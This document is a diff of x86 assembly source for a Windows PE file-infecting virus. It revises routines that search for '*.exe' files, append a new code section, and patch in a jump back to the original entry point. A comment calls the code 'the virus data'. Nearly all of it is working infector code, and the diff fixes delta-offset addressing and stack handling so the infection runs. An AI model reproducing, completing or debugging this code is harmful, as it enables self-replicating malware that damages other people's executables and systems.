@@ -79,7 +79,13 @@ deltaoffset:
     push    esi ; DOS header
     call    find_file
 
-    jmp     exit_success
+    mov     eax,ebp ; EBP -> real address of delta offset
+    add     eax,offset jambi_end
+    sub     eax,offset deltaoffset
+    mov     eax,[eax]
+    add     eax,esi
+
+    jmp     eax
 
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -125,14 +131,19 @@ find_file:
     ; push WIN32_FIND_DATA struct and filter '*.exe' and call FindFirstFile
     lea     ebx,[ebp-344]
     push    ebx
-    lea     ebx,[filter]
+    
+    mov     eax,[ebp+16]
+    add     eax,offset filter
+    sub     eax,offset deltaoffset
+
+    lea     ebx,[eax]
     push    ebx
     mov     ebx,[ebp-16]
     call    ebx
 
     ; If it hasn't found any file, jumps to exit_fail
     cmp     eax,-1
-    jz      exit_fail
+    jz      end_find_file
 
     ; else save handler
     ;push    eax ; [ebp-24]
@@ -169,10 +180,11 @@ find_file:
 
     end_find_file:
     ; cleanup/return
+    add     esp,8
+    add     esp,344 ; alloc for WIN32_FIND_DATA
     pop     edi
     pop     esi
     pop     ebx
-    add     esp,344 ; alloc for WIN32_FIND_DATA
     mov     esp,ebp
     pop     ebp
     ret     16
@@ -232,7 +244,7 @@ infect_file:
     push    [ebp+12] ; PE header
     push    [ebp+8]  ; DOS header
     call    new_code_section
-    mov     edi,eax ; save the old entry point
+    mov     ebx,eax ; save the old entry point
 
     pop     esi ; restore the fd
     ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -275,24 +287,18 @@ infect_file:
     call    edi
     pop     ecx ; size
     ; Build the "jmp Original Entry Point" code
-    sub     esp,8       ; some space
-    mov     ebx,esp     ; save esp 
-    mov     al,0BAh 
-    mov     [ebx],al    ; mov edx,
-    add     ebx,2
-    mov     [ebx],edi   ; old entry point 
-    add     ebx,4
-    mov     ax,0E2FFh   ; jmp edx
-    mov     [ebx],ax
+    sub     esp,4       ; some space
+    mov     [esp],ebx   ; old entry point 
 
     mov     ebx,1000h
-    sub     ebx,7
+    sub     ebx,4
     sub     ebx,ecx
+    mov     eax,esp
     ; Write the jmp at the end
     push    0
     push    0
-    push    7   ; size
-    push    esp ; addr
+    push    4   ; size
+    push    eax ; addr
     push    esi ; fd
     call    edi
     add     esp,8 ; restore stack
@@ -394,6 +400,7 @@ new_code_section:
     push    [ebp+20]
     call    ebx
     cmp     word ptr [esi],"ZM"
+    mov     eax,3
     jne     exit_fail ; we should have MZ in the stack
 
     ; Move to the new offset header field in the PE header
@@ -433,6 +440,7 @@ new_code_section:
     push    [ebp+20]
     call    ebx
     cmp     word ptr [esi],"EP"
+    mov     eax,1
     jne     exit_fail ; we should have EP in the stack
 
     ; Move to the Number of section field
@@ -939,7 +947,7 @@ ent_next_name:
     jmp     ent_name_done
 
     ent_name_fail:
-    mov     eax,-1          ; Return NULL, failed
+    mov     eax,0         ; Return NULL, failed
     jmp     exit_fail
 
     ent_name_done:
@@ -1091,14 +1099,9 @@ strcmp_done:
     pop     ebp
     ret     8
 
-exit_success:
-    ; WIN
-    jmp jambi_end ; more jumps there :D
-
 exit_fail:
     ; For debug :D
-    mov     edx,0DEADBEEFh
-    call    edx
+    call    eax
 
 ; All the virus data: use delta offset
 ; @MARC: ca ne peut pas marcher sauf si tu
